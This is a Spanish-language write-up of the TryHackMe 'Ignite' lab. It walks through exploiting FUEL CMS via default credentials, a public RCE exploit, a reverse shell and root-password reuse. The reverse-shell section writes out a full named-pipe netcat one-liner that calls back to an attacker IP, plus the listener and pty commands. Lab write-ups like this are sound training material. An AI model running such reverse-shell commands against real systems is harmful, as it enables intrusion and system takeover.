# 🕵️‍♂️ TryHackMe: Ignite CTF

**Autor:** Córdoba

**Fecha:** 19/04/2026

**Categoría:** Web Exploitation & Linux Privilege Escalation / eJPT

**Objetivo:** 10.128.144.49

## 1. Reconocimiento Inicial y Escaneo de Puertos
El proceso comenzó confirmando la conectividad con el servidor mediante trazas ICMP y un posterior escaneo de puertos. 

* **Escaneo de Nmap:** Se identificó el puerto 80 abierto, alojando un servidor web Apache.
* *Evidencia:*
    <img width="939" height="499" alt="ping_nmap_inicial" src="https://github.com/user-attachments/assets/563aabc1-62e3-4bce-8fed-2320024ced8c" />

* **Reconocimiento Web y Fuga de Información:** Al acceder a la página web inicial a través del navegador, identificamos que el servidor estaba corriendo **FUEL CMS**. Lo más crítico de esta fase fue que la página de inicio revelaba por defecto las credenciales de administrador (`admin:admin`).
* *Evidencias:*
    <img width="934" height="281" alt="web_contraseña" src="https://github.com/user-attachments/assets/0ac57e59-cbbb-4097-9a0a-be283bd8f25f" />
    <img width="922" height="894" alt="pagina_web" src="https://github.com/user-attachments/assets/6cdcd563-2cfd-43ef-95af-9f200802970e" />

* **Acceso al Panel:** Con estas credenciales, logramos acceder exitosamente al panel de administración del CMS, aunque nuestro objetivo era obtener ejecución de código en el servidor subyacente. Adicionalmente, ejecutamos `gobuster` y `nikto` de fondo para mapear la estructura del servidor.
* *Evidencias:*
    <img width="967" height="440" alt="accedemos_contraseña" src="https://github.com/user-attachments/assets/5ff379e5-e6db-4f04-9390-b51652353e58" />
    <img width="891" height="690" alt="gobuster" src="https://github.com/user-attachments/assets/8a7119d4-00da-4443-b818-c4041e2fd1a1" />
    <img width="960" height="672" alt="nikto" src="https://github.com/user-attachments/assets/72596ddd-b488-4929-813b-34f119d43968" />

### 2. Explotación Inicial (Initial Access)
Conocido el gestor de contenidos (FUEL CMS), procedimos a buscar vulnerabilidades públicas asociadas.

* **Búsqueda de Exploit:** Utilizando *Exploit-DB*, localizamos un exploit para la versión 1.4.1 de FUEL CMS que permitía Ejecución Remota de Código (RCE) mediante la explotación de una inyección de PHP en la evaluación de filtros.
* *Evidencia:*
    <img width="942" height="576" alt="buscamos_exploit" src="https://github.com/user-attachments/assets/19909220-b2f3-4fde-9b00-20fec442b4fc" />

* **Ejecución del Exploit Manual:** Descargamos el script de Python (`50477.py`) y lo lanzamos contra nuestro objetivo. Esto nos otorgó una "Web Shell" rudimentaria desde la cual pudimos enumerar el directorio `/home` y extraer la primera bandera.
* *Evidencias:*
    <img width="944" height="914" alt="descargo_script_python" src="https://github.com/user-attachments/assets/fb43bc30-a3fe-4ea8-8782-abf599f52439" />
    <img width="696" height="567" alt="lanzamos_script_flag" src="https://github.com/user-attachments/assets/5f40d900-61c0-4e99-a6d2-310c02431bb1" />

### 3. Mejora de Sesión (Reverse Shell & TTY Upgrade)
Dado que la consola proporcionada por el exploit web era inestable y no permitía comandos interactivos (como cambios de usuario), preparamos un entorno para recibir una Reverse Shell completa.

* **Conexión Inversa:** Pusimos un listener de Netcat en escucha en nuestra máquina atacante (`nc -lvnp 4444`) y enviamos un *payload* de tubería nombrada (Named Pipe) a través de nuestra consola web: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.159.77 4444 >/tmp/f`.
* *Evidencias:*
    <img width="319" height="106" alt="nos_ponemos_en_escucha_nc" src="https://github.com/user-attachments/assets/0e477501-54d9-4942-b760-3359cf65825d" />
    <img width="875" height="97" alt="comando_reverse_shell" src="https://github.com/user-attachments/assets/15994318-7ff5-4c04-b112-61699564bfff" />

* **Tratamiento de la TTY:** Al recibir la conexión, logramos una consola interactiva, la cual estabilizamos importando una seudo-terminal con Python (`python -c 'import pty; pty.spawn("/bin/bash")'`).
* *Evidencia:*
    <img width="554" height="197" alt="upgrade_consola" src="https://github.com/user-attachments/assets/05dd1a04-8865-4d03-97e0-495acc3ad50a" />


### 4. Escalada de Privilegios (Privilege Escalation)
Operando ya con una consola interactiva real como el usuario `www-data`, el objetivo era obtener permisos de `root`.

* **Recolección de Credenciales:** Apoyándonos en el conocimiento de la estructura de FUEL CMS, leímos el archivo de configuración de la base de datos ubicado en `fuel/application/config/database.php`.
* *Evidencia:*
    <img width="892" height="937" alt="buscamos_contrasenya_root" src="https://github.com/user-attachments/assets/a4346873-1e54-47e3-8d82-9eca1cb0e775" />

* **Contraseñas en Claro:** Dentro del archivo, localizamos las credenciales de conexión, exponiendo la contraseña del usuario `root` en texto plano.
* *Evidencia:*
    <img width="591" height="548" alt="contrasenyas" src="https://github.com/user-attachments/assets/891da032-943b-4009-ab15-f9cb54f1132d" />

* **Movimiento Lateral y Compromiso Total:** Basándonos en la premisa de la reutilización de contraseñas, ejecutamos `su root` en nuestra terminal interactiva. La contraseña de la base de datos era la misma que la del sistema operativo, otorgándonos acceso total como superusuario y permitiéndonos leer la bandera final.
* *Evidencia:*
    <img width="851" height="445" alt="conseguimos_root_flag2" src="https://github.com/user-attachments/assets/9fc73530-77ca-4f87-a77f-5f8fa0d98d13" />

### ✅ Conclusiones
La máquina Ignite fue comprometida exitosamente debido a una cadena de malas prácticas críticas:
1. **Credenciales por Defecto:** La falta de configuración y limpieza de la página por defecto expuso el acceso administrativo del CMS al público.
2. **Software Desactualizado:** Ejecutar una versión antigua y no parcheada de FUEL CMS permitió la ejecución remota de código sin necesidad de autenticación compleja previa.
3. **Reutilización de Contraseñas:** El vector de escalada de privilegios fue trivial debido a que el administrador reutilizó la misma contraseña de la base de datos web para la cuenta `root` del sistema operativo Linux.
